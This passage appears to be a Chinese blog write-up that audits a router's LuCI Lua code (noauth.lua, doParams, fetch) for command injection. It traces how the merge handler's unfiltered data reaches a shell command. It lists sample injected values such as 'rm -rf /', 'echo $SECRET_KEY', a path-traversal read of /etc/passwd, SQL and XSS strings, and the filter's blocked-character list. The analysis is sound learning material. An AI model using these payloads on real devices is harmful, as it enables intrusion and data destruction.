class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.modules.noauth&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 登录</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> disp = <span class="built_in">require</span>(<span class="string">&quot;luci.dispatcher&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.common&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span></span><br><span class="line">        tool.eweblog(<span class="string">&quot;INVALID DATA&quot;</span>, <span class="string">&quot;LOGIN FAILED&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> authOk</span><br><span class="line">    <span class="keyword">local</span> ua = <span class="built_in">os</span>.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_USER_AGENT&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;unknown brower (ua is nil)&quot;</span></span><br><span class="line">    tool.eweblog(ua, <span class="string">&quot;LOGIN UA&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> checkStat = &#123;</span><br><span class="line">        password = params.password,</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span>, <span class="comment">-- params.username,</span></span><br><span class="line">        encry = params.encry,</span><br><span class="line">        limit = params.limit</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br><span class="line">    <span class="keyword">local</span> log_opt = &#123;username = params.username, level = <span class="string">&quot;auth.notice&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> authres <span class="keyword">then</span></span><br><span class="line">        authOk = disp.writeSid(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="comment">-- 手动登录时设置时间</span></span><br><span class="line">        <span class="keyword">if</span> params.<span class="built_in">time</span> <span class="keyword">and</span> <span class="built_in">tonumber</span>(params.<span class="built_in">time</span>) <span class="keyword">then</span></span><br><span class="line">            common.setSysTime(&#123;<span class="built_in">time</span> = params.<span class="built_in">time</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-success&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-fail&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tool.write_log(log_opt)</span><br><span class="line">    <span class="keyword">return</span> authOk</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 单点登录</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">singleLogin</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> sauth = luci.sauth</span><br><span class="line">    <span class="keyword">local</span> fs = <span class="built_in">require</span> <span class="string">&quot;nixio.fs&quot;</span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">config</span> = <span class="built_in">require</span>(<span class="string">&quot;luci.config&quot;</span>)</span><br><span class="line">    <span class="built_in">config</span>.sauth = <span class="built_in">config</span>.sauth <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">local</span> sessionpath = <span class="built_in">config</span>.sauth.sessionpath</span><br><span class="line">    <span class="keyword">if</span> sauth.sane() <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> id</span><br><span class="line">        <span class="keyword">for</span> id <span class="keyword">in</span> fs.dir(sessionpath) <span class="keyword">do</span></span><br><span class="line">            sauth.kill(id)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 网络合并</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ping checknet</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNet</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">if</span> params.host <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">len</span>(params.host) &gt; <span class="number">50</span> <span class="keyword">or</span> <span class="keyword">not</span> tool.checkIp(params.host) <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> &#123;connect = <span class="literal">false</span>, msg = <span class="string">&quot;host illegal&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> json = <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">        <span class="keyword">local</span> _curl =</span><br><span class="line">            <span class="string">&#x27;curl -s -k -X POST \&#x27;http://%s/cgi-bin/luci/api/auth\&#x27; -H content-type:application/json -d \&#x27;&#123;&quot;method&quot;:&quot;checkNet&quot;&#125;\&#x27;&#x27;</span> %</span><br><span class="line">            params.host</span><br><span class="line">        <span class="keyword">local</span> _data = json.decode(luci.sys.exec(_curl))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(_data) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(_data.data) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">return</span> _data.data</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">return</span> &#123;connect = <span class="literal">false</span>&#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> &#123;connect = <span class="literal">false</span>&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> &#123;connect = <span class="literal">true</span>&#125;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>向<a href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_3">winmt师傅</a>学习</p><p>在noauth.lua中，有<code>login</code>，<code>singleLogin</code>，<code>merge</code>和<code>checkNet</code>四个方法。其中，<code>singleLogin</code>函数无可控制的参数，不用看；<code>checkNet</code>函数中参数可控的字段只有<code>params.host</code>，并拼接入了命令字符串执行，但是在之前有<code>tool.checkIp(params.host)</code>对其的合法性进行了检查，无法绕过。</p><p>那么思考如果没有对host进行合法性检查有什么利用手段呢？</p><ol><li><strong>输入验证和注入攻击</strong>：<ul><li>SQL注入：如果非法地址未被正确验证并直接用于数据库查询，攻击者可能构造恶意输入来执行任意SQL代码。<ul><li>例如：<code>params.host = &quot;192.168.1.1&#39;; DROP TABLE users; --&quot;</code></li></ul></li><li>命令注入：如果非法地址用于系统命令或脚本执行，攻击者可能注入恶意命令。<ul><li>例如：<code>params.host = &quot;192.168.1.1; rm -rf / --&quot;</code></li><li><code>params.host = &quot;192.168.1.1;rm -rf /*&#39;#&quot;</code>加个’让url闭合#注释掉之后的直到’</li></ul></li></ul></li><li><strong>跨站脚本攻击（XSS）</strong>：<ul><li>如果非法地址未被正确过滤并显示在网页中，攻击者可能插入恶意脚本，导致XSS攻击。<ul><li>例如：<code>params.host = &quot;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;&quot;</code></li></ul></li></ul></li><li><strong>跨站请求伪造（CSRF）</strong>：<ul><li>如果非法地址用于生成或处理URL，攻击者可能构造恶意请求以执行CSRF攻击。<ul><li>例如：<code>params.host = &quot;example.com&quot;;</code> 被替换为攻击者控制的域名。</li></ul></li></ul></li><li><strong>拒绝服务（DoS）攻击</strong>：<ul><li>处理非法地址可能导致服务器资源耗尽，导致服务不可用。例如，处理一个非常长的字符串或复杂的正则表达式可能消耗大量CPU和内存资源。</li></ul></li><li><strong>信息泄露</strong>：<ul><li>如果非法地址包含敏感信息且未被正确处理，可能导致信息泄露。<ul><li>例如：<code>params.host = &quot;192.168.1.1; echo $SECRET_KEY&quot;</code></li></ul></li></ul></li><li><strong>路径遍历攻击</strong>：<ul><li>如果非法地址用于文件路径操作，攻击者可能利用路径遍历来访问或修改不应访问的文件。<ul><li>例如：<code>params.host = &quot;../../../../etc/passwd&quot;</code></li></ul></li></ul></li></ol><p>这就是web吗太高级了woc</p><p>可惜对host字段进行了check</p><p>那么来看login函数，乍一看可以控制的字符十分的多，params.password，params.time，params.encry，params.limit</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 登录</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> disp = <span class="built_in">require</span>(<span class="string">&quot;luci.dispatcher&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.common&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span>  <span class="comment">--password过滤危险字符，猜测之后有命令执行</span></span><br><span class="line">        tool.eweblog(<span class="string">&quot;INVALID DATA&quot;</span>, <span class="string">&quot;LOGIN FAILED&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> authOk</span><br><span class="line">    <span class="keyword">local</span> ua = <span class="built_in">os</span>.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_USER_AGENT&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;unknown brower (ua is nil)&quot;</span></span><br><span class="line">    tool.eweblog(ua, <span class="string">&quot;LOGIN UA&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> checkStat = &#123;</span><br><span class="line">        password = params.password,</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span>, <span class="comment">-- params.username,</span></span><br><span class="line">        encry = params.encry,</span><br><span class="line">        limit = params.limit</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br><span class="line">    <span class="keyword">local</span> log_opt = &#123;username = params.username, level = <span class="string">&quot;auth.notice&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> authres <span class="keyword">then</span></span><br><span class="line">        authOk = disp.writeSid(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="comment">-- 手动登录时设置时间</span></span><br><span class="line">        <span class="keyword">if</span> params.<span class="built_in">time</span> <span class="keyword">and</span> <span class="built_in">tonumber</span>(params.<span class="built_in">time</span>) <span class="keyword">then</span></span><br><span class="line">            common.setSysTime(&#123;<span class="built_in">time</span> = params.<span class="built_in">time</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-success&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-fail&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tool.write_log(log_opt)</span><br><span class="line">    <span class="keyword">return</span> authOk</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>可以看到</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span>  <span class="comment">--password过滤危险字符，猜测之后有命令执行</span></span><br></pre></td></tr></table></figure><p>这里过滤了</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeXxs</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="keyword">local</span> ngstr = <span class="string">&quot;[`&amp;$;|]&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, ngstr) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>winmt师傅说少过滤了一个\n或许未来有命令注入的可能，类似；这个效果</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br></pre></td></tr></table></figure><p>这边有个tool调用checkPasswd</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 检测密码是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPasswd</span><span class="params">(checkStat)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> _data = &#123;</span><br><span class="line">        <span class="built_in">type</span> = checkStat.encry <span class="keyword">and</span> <span class="string">&quot;enc&quot;</span> <span class="keyword">or</span> <span class="string">&quot;noenc&quot;</span>,</span><br><span class="line">        password = checkStat.password,</span><br><span class="line">        name = checkStat.username,</span><br><span class="line">        limit = checkStat.limit <span class="keyword">and</span> <span class="string">&quot;true&quot;</span> <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> _check = cmd.devSta.get(&#123;<span class="built_in">module</span> = <span class="string">&quot;adminCheck&quot;</span>, device = <span class="string">&quot;pc&quot;</span>, data = _data&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(_check) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> _check.result == <span class="string">&quot;success&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>, _check.reason</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>会发现encry字段和limit字段都变成了加密或者不加密，真或者假，好像变得不可控了</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _check = cmd.devSta.get(&#123;<span class="built_in">module</span> = <span class="string">&quot;adminCheck&quot;</span>, device = <span class="string">&quot;pc&quot;</span>, data = _data&#125;)  <span class="comment">--传入的参数为json</span></span><br></pre></td></tr></table></figure><p>调用了cmd的devSta.get</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> opt[i] == <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">    devCap[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p> 它是首先会将params传入doParams解析，之后用fetch</p><p>那么来分析一下doParams函数</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">doParams</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="comment">-- web接口调用全部去掉时间，强制force设置下去</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(params.data) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span>    <span class="comment">--如果是table表那么赋值0</span></span><br><span class="line">        params.data.currentTime = <span class="literal">nil</span></span><br><span class="line">        params.data.configTime = <span class="literal">nil</span></span><br><span class="line">        params.data.configId = <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">if</span> tool.includeXxs(params.<span class="built_in">module</span>) <span class="keyword">or</span> tool.includeXxs(params.method) <span class="keyword">then</span>     <span class="comment">--过滤危险符号</span></span><br><span class="line">        params.<span class="built_in">module</span> = <span class="string">&quot;illegalMoule&quot;</span></span><br><span class="line">        params.method = <span class="string">&quot;illegalMethod&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> params.<span class="built_in">module</span> <span class="keyword">or</span> <span class="keyword">not</span> params.method) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;please input module&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password = <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">local</span> _shell = params.cfg_cmd .. <span class="string">&quot; &quot;</span> .. params.method .. <span class="string">&quot; --module &#x27;&quot;</span> .. params.<span class="built_in">module</span> .. <span class="string">&quot;&#x27;&quot;</span>   <span class="comment">--构建shell</span></span><br><span class="line">        <span class="comment">-- 远程代理调用</span></span><br><span class="line">        <span class="keyword">if</span> params.remoteIp <span class="keyword">then</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -i &#x27;&quot;</span> .. params.remoteIp .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">            ip = params.remoteIp</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> params.remotePwd <span class="keyword">and</span> <span class="keyword">not</span> (params.cur) <span class="keyword">then</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -p &#x27;&quot;</span> .. params.remotePwd .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">            password = params.remotePwd</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> params.data <span class="keyword">then</span>               <span class="comment">--处理data</span></span><br><span class="line">            data = luci.json.encode(params.data)    <span class="comment">--data便是上文的passwd字段，进行了json编码（unicode加密）</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; &#x27;&quot;</span> .. data .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> params.async == <span class="literal">true</span> <span class="keyword">or</span> params.async == <span class="string">&quot;true&quot;</span> <span class="keyword">then</span></span><br><span class="line">            back = <span class="number">0</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -b 0 &quot;</span></span><br><span class="line">        <span class="keyword">elseif</span> params.async == <span class="literal">false</span> <span class="keyword">or</span> params.async == <span class="string">&quot;false&quot;</span> <span class="keyword">then</span></span><br><span class="line">            back = <span class="number">1</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -b 1 &quot;</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> data, back, ip, password, _shell</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>而这里会把\n字符编码为\u000a，导致最后的漏洞点被补上</p><p>因此看最后一个merge函数</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 网络合并</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>可以看到没有对params有任何的处理，调用了set函数</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">devSta[<span class="string">&#x27;set&#x27;</span>] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    params.method = <span class="string">&#x27;set&#x27;</span></span><br><span class="line">    params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">    <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>data字段便是我们可控的（即最初<code>POST</code>报文中<code>params</code>的内容）</p><p>主fetch函数的调用</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(fn, shell, params, ...)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _start = <span class="built_in">os</span>.<span class="built_in">time</span>()</span><br><span class="line">    <span class="keyword">local</span> _res = fn(...)</span><br><span class="line">    tool.eweblog(shell, params.device, <span class="built_in">os</span>.<span class="built_in">time</span>() - _start)</span><br><span class="line">    <span class="keyword">if</span> params.method ~= <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">        tool.write_log(&#123;action = shell&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> _res.code == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        _res = _res.data <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> params.noParse <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> _res</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> _res <span class="keyword">and</span> luci.json.decode(_res) <span class="keyword">or</span> (_res <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> _res</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>其中的fn函数便是modle.fetch</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--主函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(cmd, module, param, back, ip, password, force, not_change_configId, multi)</span></span></span><br><span class="line">    <span class="keyword">local</span> uf_call = <span class="built_in">require</span> <span class="string">&quot;libuflua&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ctype</span><br><span class="line"></span><br><span class="line">    ctype = get_ctype()</span><br><span class="line">    param = param <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    ip = ip <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    password = password <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> force <span class="keyword">and</span> force == <span class="string">&quot;1&quot;</span> <span class="keyword">then</span></span><br><span class="line">    force = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    force = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span 